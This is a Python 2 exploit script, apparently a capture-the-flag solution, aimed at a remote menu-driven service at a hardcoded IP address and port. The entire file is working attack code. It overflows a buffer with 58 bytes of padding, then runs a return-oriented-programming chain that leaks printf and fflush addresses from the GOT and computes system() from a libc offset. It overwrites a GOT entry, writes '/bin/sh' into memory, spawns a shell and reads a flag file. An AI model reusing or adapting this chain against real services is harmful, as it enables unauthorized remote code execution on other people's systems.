from err0rless import connst
from struct import pack, unpack

s, t = connst("61.105.8.2", 11013)
#s, t = connst("192.168.36.130", 11013)

# ppppr 0x08048F4C
def pMain():
	print t.read_until("Option: ")
	s.send("4\n")

	print s.recv(1024)
	s.send("1\n")

	print s.recv(1024)
	s.send("1\n")

	p  = pack("I", 0x08048882)
	p += pack("I", 0x08048986)
	p += pack("I", 0x0804B1B8)

	print  s.recv(1024)
	s.send("A" * 58 + pack("I", 0x0804B1B4) + p)

	p  = pack("I", 0x08048540)   # write
	p += pack("I", 0x08048F4C+3)
	p += pack("I", 0x0804B010)

	p += pack("I", 0x080484E0) # read
	p += pack("I", 0x08048F4C + 1)
	p += pack("I", 0x00)
	p += pack("I", 0x0804B02C)
	p += pack("I", 4)

	p += pack("I", 0x080484E0)   # read
	p += pack("I", 0x08048F4C + 1)
	p += pack("I", 0x00)
	p += pack("I", 0x0804B1B8 + 250)
	p += pack("I", 16)

	p += pack("I", 0x080484E0) # read
	p += pack("I", 0x08048F4C + 1)
	p += pack("I", 0x00)
	p += pack("I", 0x0804B1B8 + 200)
	p += pack("I", 20)

	p += pack("I", 0x08048f4f)
	p += pack("I", 0x0804B1B8 + 196)
	p += pack("I", 0x08048986)
	# 0x08048f4f pop ebp

	s.send(p + "\n")

	x = s.recv(1024)
	printf = unpack("I", x[:4])[0]
	fflush = unpack("I", x[4:8])[0]

	print hex(printf)
	print hex(fflush)

	#system = printf-(-431744)#+61476
	system=printf-(-428384)
	s.send(pack("I", system))

	print hex(system)
	print hex(printf-61392)

	s.send("/bin/sh\x00" + pack("I", 0x0804B1B8 + 250) + pack("I", 0x00000000))

	#system = printf -53488

	a  = pack("I", 0x08048560)
	a += pack("I", 0x08048F4C+3)
	a += pack("I", 0x0804B1B8+250)
	a += pack("I", 0x0804B1B8+258)
	a += pack("I", 0x00000000)

	s.send(a)

	s.send("cat /home/market1/flag\n")

	print s.recv(1024)
	print s.recv(1024)

#libc_base + 0x00040190
if __name__ == "__main__":
	pMain()